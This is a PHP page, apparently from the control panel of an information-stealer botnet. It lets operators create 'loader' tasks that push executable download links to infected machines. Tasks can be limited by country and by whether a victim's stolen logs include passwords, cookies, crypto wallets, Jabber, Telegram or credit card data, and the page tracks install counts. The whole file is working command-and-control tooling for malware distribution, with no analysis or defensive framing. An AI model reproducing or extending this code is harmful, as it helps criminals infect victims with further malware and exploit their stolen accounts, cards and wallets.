<?php 
   session_start();
   include 'database.php';
	require_once("auth.php");
$delete = formatString($_GET["delete"]);
if(isset($_POST['create'])){
$name = formatString($_POST["name"]);
$count = formatString($_POST["count"]);
$country = formatString($_POST["country"]);
$task = formatString($_POST["task"]);
$preset = formatString($_POST["preset"]);
if(isset($_POST["pass"])) $pass="on"; else $pass="off";
if(isset($_POST["cookie"]))	$cookies="on"; else $cookies="off";
if(isset($_POST["wallet"]))	$wallets="on"; else $wallets="off";
if(isset($_POST["jabb"]))	$jabb="on"; else $jabb="off";
if(isset($_POST["tg"]))	$tg="on"; else $tg="off";
if(isset($_POST["cc"]))	$cc="on"; else $cc="off";
$str = $pass.';'.$cookies.';'.$wallets.';'.$jabb.';'.$tg.';'.$cc;

if ($name != null & $count != null & $country != null & $task != null) {
    $pdoConnection->exec("INSERT INTO `tasks`(`id`, `name`, `count`, `country`, `task`, `preset`,`params`,`status`) VALUES (null, '$name', '$count', '$country', '$task', '$preset','$str', 0)");
}
}
if ($delete != null) {
    $pdoConnection->exec("DELETE FROM `tasks` WHERE id = '" . formatString($delete) . "'");
    header("Location: loader.php", true, 301);
}

function formatString($param)
{
    $returnString = $param;
    $returnString = trim($returnString);
    $returnString = stripslashes($returnString);
    $returnString = htmlspecialchars($returnString);

    return $returnString;
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <title>Loader</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link href="assets/css/bootstrap.min.css" rel="stylesheet" type="text/css"/>
	<link href="assets/css/switch.css" rel="stylesheet" type="text/css"/>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css">
    <link href="assets/css/app.min.css" rel="stylesheet" type="text/css"/>
</head>

<header id="topnav">
    <div class="topbar-menu">
        <div class="container-fluid">
            <div id="navigation">
                <ul class="navigation-menu">
                    <li>
                        <a href="index.php">
                            <i class="fas fa-hashtag"></i>Dashboard</a>
                    </li>

                    <li>
                        <a href="loader.php">
                            <i class="fas fa-tasks"></i>Loader</a>
                    </li>

                    <li>
                        <a href="converter.php">
                            <i class="fas fa-arrows-alt-h"></i>Cookies Converter</a>
                    </li>
					<li>
                     <a href="search.php">
                     <i class="fas fa-search"></i>Search</a>
                  </li>
				  <li>
                     <a href="settings.php">
                     <i class="fas fa-cogs"></i>Settings</a>
                  </li>
                </ul>
                <div class="clearfix"></div>
            </div>
        </div>
    </div>
</header>

<div class="wrapper">
    <div class="container-fluid">
        <div class="row">
            <div class="col-12">
                <div class="card">
                    <div class="card-body">
                        <h4 class="header-title"></h4>
                        <form class="form-horizontal" action="" method="POST">
                            <div class="form-group row">
                                <label class="col-sm-2 col-form-label">Name</label>
                                <div class="col-sm-10">
                                    <input class="form-control" placeholder="Task name" value="" name="name"
                                           type="text">
                                </div>
                            </div> <div class="form-group row">
                                <label class="col-sm-2 col-form-label">Preset</label>
								<div class="col-sm-10">
							               <select class="form-control" name="preset">
											<option value="all" selected>All</option>
											<?php
											$presets = $pdoConnection->query("SELECT * FROM `presets`");
											while ($preset = $presets->fetch(PDO::FETCH_ASSOC))
											{
												echo '<option value="'.$preset["name"].'">'.$preset["name"]."</option>";
											}
											?>
											</select>
											</div>
                           </div>
                            <div class="form-group row">
                                <label class="col-sm-2 col-form-label">Count</label>
                                <div class="col-sm-10">
                                    <input class="form-control" placeholder="0 or 1 or 2 or 1000" value="" name="count"
                                           type="text">
                                </div>
                            </div>
                            <div class="form-group row">
                                <label class="col-sm-2 col-form-label">Country</label>
                                <div class="col-sm-10">
                                    <input class="form-control" placeholder="* or RU or RU,KZ,..." value=""
                                           name="country" type="text">
                                </div>
                            </div>
                            <div class="form-group row">
                                <label class="col-sm-2 col-form-label">Links</label>
                                <div class="col-sm-10">
								<input class="form-control" name="task" placeholder="http://domain.com/file.exe;http://domain.com/file.exe;">
                                </div>
                            </div>
							<div class = "collumn">
									<div class="form-group row x300">
                                        <label class="col-sm-2 col-form-label">With passwords</label>
                                        <label class="switch">
										  <input type="checkbox" name="pass">
										  <span class="slider round"></span>
										</label>
                                    </div>
									<div class="form-group row x300">
                                        <label class="col-sm-2 col-form-label">With cookies</label>
                                        <label class="switch">
										  <input type="checkbox" name="cookie">
										  <span class="slider round"></span>
										</label>
                                    </div>
									<div class="form-group row x300">
                                        <label class="col-sm-2 col-form-label">With wallets</label>
                                        <label class="switch">
										  <input type="checkbox" name="wallet">
										  <span class="slider round"></span>
										</label>
                                    </div>
									</div>
									<div class = "collumn">
									<div class="form-group row x300">
                                        <label class="col-sm-2 col-form-label">With Jabber</label>
                                        <label class="switch">
										  <input type="checkbox" name="jabb">
										  <span class="slider round"></span>
										</label>
                                    </div>
									<div class="form-group row x300">
                                        <label class="col-sm-2 col-form-label">With Telegram</label>
                                        <label class="switch">
										  <input type="checkbox" name="tg">
										  <span class="slider round"></span>
										</label>
                                    </div>
									<div class="form-group row x300">
                                        <label class="col-sm-2 col-form-label">With CC</label>
                                        <label class="switch">
										  <input type="checkbox" name="cc">
										  <span class="slider round"></span>
										</label>
                                    </div>
									</div>
									<div class="buttonsBlock"><center><button type="submit" name="create" class="btn btn-primary">Create</button></div></center>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="container-fluid">
        <div class="row">
            <div class="col-12">
                <div class="page-title-box">
                    <h4 class="page-title">Tasks</h4>
                </div>
            </div>
        </div>
        <div class="row">
            <div class="col-12">
                <div class="card">
                    <div class="card-body">
                        <h4 class="header-title">Tasks</h4>
                        <div class="table-responsive mt-3" style="overflow-x: inherit;">
                            <table class="table table-hover table-centered mb-0">
                                <thead>
                                <tr>
                                    <th>ID</th>
									<th>Preset</th>
                                    <th>Name</th>
									<th>Params</th>
                                    <th>Count</th>
                                    <th>Country</th>
                                    <th>Status</th>
                                    <th>Actions</th>
                                </tr>
                                </thead>
                                <tbody>
                                <?php 
                                $tasks = $pdoConnection->query("SELECT * FROM `tasks`");
                                while ($task = $tasks->fetch(PDO::FETCH_ASSOC)) {
                                    if ($task["status"] < $task["count"]) {
                                        $status = "<button type=\"button\" class=\"btn btn-warning btn-sm\">" . $task["status"] . " \\ " . $task["count"] . "</button>";
                                    } else if ($task["count"] == 0) {
                                        $status = "<button type=\"button\" class=\"btn btn-info btn-sm\">∞</button>";
                                    } else {
                                        $status = "<button type=\"button\" class=\"btn btn-success btn-sm\">Finished</button>";
                                    }
                                    ?>
                                    <tr>
                                        <th><?php  echo $task["id"]; ?></th>
										<th><?php  echo $task["preset"]; ?></th>
                                        <th><?php  echo $task["name"]; ?></th>
										<th><?php  echo $task["params"]; ?></th>
                                        <th><?php  echo $task["count"]; ?></th>
                                        <th><?php  echo $task["country"]; ?></th>
                                        <th><?php  echo $status ?></th>
                                        <th><a href="loader.php?delete=<?php  echo $task["id"]; ?>">
                                                <button type="button" class="btn btn-danger btn-sm">Delete</button>
                                            </a></th>
                                    </tr>
                                    <?php 
                                }
                                ?>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
      integrity="sha384-B0UglyR+jN6CkvvICOB2joaf5I4l3gm9GU6Hc1og6Ls7i6U/mkkaduKaBhlAXv9k"
      crossorigin="anonymous"></script>
</html>